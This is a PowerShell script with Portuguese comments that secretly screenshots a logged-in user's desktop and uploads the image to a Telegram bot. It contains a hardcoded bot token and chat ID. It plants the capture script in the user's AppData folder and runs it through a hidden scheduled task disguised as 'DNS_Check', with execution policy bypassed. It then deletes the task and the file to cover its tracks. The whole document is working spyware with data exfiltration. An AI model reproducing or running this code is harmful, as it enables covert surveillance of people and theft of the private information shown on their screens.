# --- CRIAÇÃO DO FICHEIRO PS1 ---
$conteudo = @'
$botToken  = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId    = "5757392163"
$outFile  = "$env:TEMP\screenshot.png"

$signature = @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
        int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr obj);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr dc);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    public const int SRCCOPY = 0x00CC0020;
}
"@

if (Test-Path "$env:TEMP\screenshot.png") {
    Remove-Item "$env:TEMP\screenshot.png" -Force
}

Add-Type $signature

Add-Type -AssemblyName System.Drawing

# ============================
# CAPTURAR ECRÃƒ
# ============================

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

$desktop = [Native]::GetDesktopWindow()
$dc = [Native]::GetWindowDC($desktop)

$width  = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
$height = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height

$memDC = [Native]::CreateCompatibleDC($dc)
$hBitmap = [Native]::CreateCompatibleBitmap($dc, $width, $height)
[Native]::SelectObject($memDC, $hBitmap) | Out-Null
[Native]::BitBlt($memDC, 0, 0, $width, $height, $dc, 0, 0, [Native]::SRCCOPY) | Out-Null

$bitmap = [System.Drawing.Bitmap]::FromHbitmap($hBitmap)
$bitmap.Save($outFile, [System.Drawing.Imaging.ImageFormat]::Png)
$bitmap.Dispose()

[Native]::DeleteObject($hBitmap) | Out-Null
[Native]::DeleteDC($memDC) | Out-Null
[Native]::ReleaseDC($desktop, $dc) | Out-Null

# ============================
# ENVIAR PARA TELEGRAM
# ============================

$message   = ""
$imagePath = "$outFile"

Add-Type -AssemblyName System.Net.Http

# Create multipart form data
$multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

# Add chat_id and caption as string content
$multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)), "chat_id")
$multipartContent.Add((New-Object System.Net.Http.StringContent($message)), "caption")

# Add the image as file content
$fileStream = [System.IO.FileStream]::new($imagePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/jpeg")
$multipartContent.Add($fileContent, "photo", [System.IO.Path]::GetFileName($imagePath))

# Send the request using HttpClient
$httpClient = [System.Net.Http.HttpClient]::new()
$response = $httpClient.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto", $multipartContent).Result

# Output the response
$response.Content.ReadAsStringAsync().Result

# Clean up: dispose of the stream and client
$fileStream.Dispose()
$httpClient.Dispose()

exit

'@


# Obter lista de usuários
$users = quser | Select-Object -Skip 1 | ForEach-Object {
    $parts = ($_ -replace "\s{2,}", ",").Split(",")
    if ($parts.Count -ge 6) {
        [PSCustomObject]@{
            UserName    = $parts[0].Trim()
            SessionName = $parts[1].Trim()
            ID          = $parts[2].Trim()
            State       = $parts[3].Trim()
            IdleTime    = $parts[4].Trim()
            LogonTime   = $parts[5].Trim()
        }
    }
}

# Pegar apenas o primeiro usuário ativo
$activeUser = $users | Where-Object { $_.State -eq "Active" } | Select-Object -First 1


if ($activeUser) {
    $taskName = "DNS_Check"
    $userName = $activeUser.UserName.TrimStart('>')
    $computerName = $env:COMPUTERNAME

    
    $ficheiro = "C:\Users\$userName\AppData\Local\print.ps1"
    if (Test-Path "$ficheiro") {
        Remove-Item "$ficheiro" -Force
    }
    Set-Content -Path $ficheiro -Value $conteudo -Encoding UTF8

    # Criar ação da tarefa
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ficheiro`""

    # Criar trigger para rodar uma vez imediatamente
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60)

    # Criar principal (executa como usuário atual, oculto)
    $principal = New-ScheduledTaskPrincipal -UserId "$computerName\$userName"
    # Registrar tarefa oculta
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

    # Rodar a tarefa
    Start-ScheduledTask -TaskName $taskName

    # Espera um pouco para garantir execução
    Start-Sleep -Seconds 3

    # Deletar tarefa
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}


# Remover o ficheiro PS1
Remove-Item "$ficheiro" -Force

exit